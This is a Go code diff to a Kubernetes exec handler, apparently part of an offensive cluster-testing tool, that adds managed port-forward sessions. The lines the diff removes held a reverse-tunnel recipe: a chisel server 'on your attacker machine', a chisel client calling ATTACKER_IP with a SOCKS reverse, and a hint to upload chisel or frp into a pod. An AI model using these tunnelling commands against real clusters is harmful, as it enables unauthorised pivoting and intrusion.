@@ -3,8 +3,10 @@ package handler
 import (
 	"context"
 	"fmt"
+	"net"
 	"net/http"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/gin-gonic/gin"
@@ -19,9 +21,65 @@ func buildK8sClient(targetHost, token, username, password string, skipTLS bool) 
 	return kubectl.NewTargetClient(targetHost, token, username, password, skipTLS)
 }
 
-type ExecHandler struct{}
+type PortForwardSession struct {
+	ID         string    `json:"id"`
+	TargetHost string    `json:"target_host"`
+	Namespace  string    `json:"namespace"`
+	PodName    string    `json:"pod_name"`
+	LocalPort  int       `json:"local_port"`
+	PodPort    int       `json:"pod_port"`
+	StartedAt  time.Time `json:"started_at"`
+}
 
-func NewExecHandler() *ExecHandler { return &ExecHandler{} }
+type portForwardSessionState struct {
+	PortForwardSession
+	stopCh chan struct{}
+}
+
+type PortForwardManager struct {
+	mu       sync.RWMutex
+	sessions map[string]*portForwardSessionState
+}
+
+func NewPortForwardManager() *PortForwardManager {
+	return &PortForwardManager{sessions: make(map[string]*portForwardSessionState)}
+}
+
+func (m *PortForwardManager) Add(s *portForwardSessionState) {
+	m.mu.Lock()
+	defer m.mu.Unlock()
+	m.sessions[s.ID] = s
+}
+
+func (m *PortForwardManager) List() []PortForwardSession {
+	m.mu.RLock()
+	defer m.mu.RUnlock()
+	result := make([]PortForwardSession, 0, len(m.sessions))
+	for _, s := range m.sessions {
+		result = append(result, s.PortForwardSession)
+	}
+	return result
+}
+
+func (m *PortForwardManager) Stop(id string) (PortForwardSession, bool) {
+	m.mu.Lock()
+	defer m.mu.Unlock()
+	s, ok := m.sessions[id]
+	if !ok {
+		return PortForwardSession{}, false
+	}
+	delete(m.sessions, id)
+	close(s.stopCh)
+	return s.PortForwardSession, true
+}
+
+type ExecHandler struct {
+	portForwards *PortForwardManager
+}
+
+func NewExecHandler() *ExecHandler {
+	return &ExecHandler{portForwards: NewPortForwardManager()}
+}
 
 // APIServer exec
 func (h *ExecHandler) APIListPods(c *gin.Context) {
@@ -467,11 +525,14 @@ func (h *ExecHandler) PortForwardInfo(c *gin.Context) {
 		TargetHost string `json:"target_host" binding:"required"`
 		Namespace  string `json:"namespace"`
 		PodName    string `json:"pod_name" binding:"required"`
+		LocalPort  int    `json:"local_port"`
 		PodPort    int    `json:"pod_port"`
 		Token      string `json:"token"`
 		Username   string `json:"username"`
 		Password   string `json:"password"`
 		SkipTLS    bool   `json:"skip_tls"`
+		Preview    bool   `json:"preview"`
+		TimeoutSec int    `json:"timeout_sec"`
 	}
 	if err := c.ShouldBindJSON(&req); err != nil {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
@@ -483,23 +544,95 @@ func (h *ExecHandler) PortForwardInfo(c *gin.Context) {
 	if req.PodPort == 0 {
 		req.PodPort = 80
 	}
-
-	// Generate port-forward instructions
-	localPort := req.PodPort
-	if localPort < 1024 {
-		localPort = localPort + 8000 // avoid privileged ports
+	if req.TimeoutSec == 0 {
+		req.TimeoutSec = 10
 	}
 
-	c.JSON(http.StatusOK, gin.H{
-		"command":              fmt.Sprintf("kubectl port-forward -n %s pod/%s %d:%d", req.Namespace, req.PodName, localPort, req.PodPort),
-		"namespace":            req.Namespace,
-		"pod_name":             req.PodName,
-		"pod_port":             req.PodPort,
-		"suggested_local_port": localPort,
-		"chisel_proxy": gin.H{
-			"server_cmd": fmt.Sprintf("# On your attacker machine:\n./chisel server -p 8080 --reverse"),
-			"client_cmd": fmt.Sprintf("# After uploading chisel to pod:\n./chisel client ATTACKER_IP:8080 R:socks"),
+	localPort := req.LocalPort
+	if localPort == 0 {
+		localPort = suggestLocalPort(req.PodPort)
+	}
+	command := fmt.Sprintf("kubectl port-forward -n %s pod/%s %d:%d", req.Namespace, req.PodName, localPort, req.PodPort)
+	if req.Preview {
+		c.JSON(http.StatusOK, gin.H{
+			"command":              command,
+			"namespace":            req.Namespace,
+			"pod_name":             req.PodName,
+			"pod_port":             req.PodPort,
+			"suggested_local_port": localPort,
+			"preview":              true,
+			"hint":                 "Set preview=false or omit it to open a managed API-server port-forward session.",
+		})
+		return
+	}
+
+	client, err := buildK8sClient(req.TargetHost, req.Token, req.Username, req.Password, req.SkipTLS)
+	if err != nil {
+		c.JSON(http.StatusOK, gin.H{"error": err.Error(), "command": command})
+		return
+	}
+	ctx, cancel := context.WithTimeout(c.Request.Context(), time.Duration(req.TimeoutSec)*time.Second)
+	defer cancel()
+	stopCh, err := client.PortForward(ctx, req.Namespace, req.PodName, localPort, req.PodPort)
+	if err != nil {
+		c.JSON(http.StatusOK, gin.H{"error": err.Error(), "command": command})
+		return
+	}
+	session := &portForwardSessionState{
+		PortForwardSession: PortForwardSession{
+			ID:         fmt.Sprintf("pf-%d", time.Now().UnixNano()),
+			TargetHost: req.TargetHost,
+			Namespace:  req.Namespace,
+			PodName:    req.PodName,
+			LocalPort:  localPort,
+			PodPort:    req.PodPort,
+			StartedAt:  time.Now(),
 		},
-		"hint": "使用 kubectl cp 将 chisel/frp 等代理工具上传到 Pod，然后通过端口转发建立 SOCKS 代理通道",
+		stopCh: stopCh,
+	}
+	h.portForwards.Add(session)
+
+	c.JSON(http.StatusOK, gin.H{
+		"success":    true,
+		"session":    session.PortForwardSession,
+		"command":    command,
+		"local_url":  fmt.Sprintf("http://127.0.0.1:%d", localPort),
+		"stop_api":   fmt.Sprintf("DELETE /api/v1/exec/port-forward/%s", session.ID),
+		"status_api": "GET /api/v1/exec/port-forward/sessions",
 	})
+}
+
+func (h *ExecHandler) ListPortForwards(c *gin.Context) {
+	c.JSON(http.StatusOK, gin.H{"sessions": h.portForwards.List()})
+}
+
+func (h *ExecHandler) StopPortForward(c *gin.Context) {
+	session, ok := h.portForwards.Stop(c.Param("id"))
+	if !ok {
+		c.JSON(http.StatusNotFound, gin.H{"error": "port-forward session not found"})
+		return
+	}
+	c.JSON(http.StatusOK, gin.H{"success": true, "session": session})
+}
+
+func suggestLocalPort(podPort int) int {
+	candidate := podPort
+	if candidate < 1024 {
+		candidate += 8000
+	}
+	for port := candidate; port < candidate+100; port++ {
+		if isPortAvailable(port) {
+			return port
+		}
+	}
+	return candidate
+}
+
+func isPortAvailable(port int) bool {
+	ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", port))
+	if err != nil {
+		return false
+	}
+	_ = ln.Close()
+	return true
 }
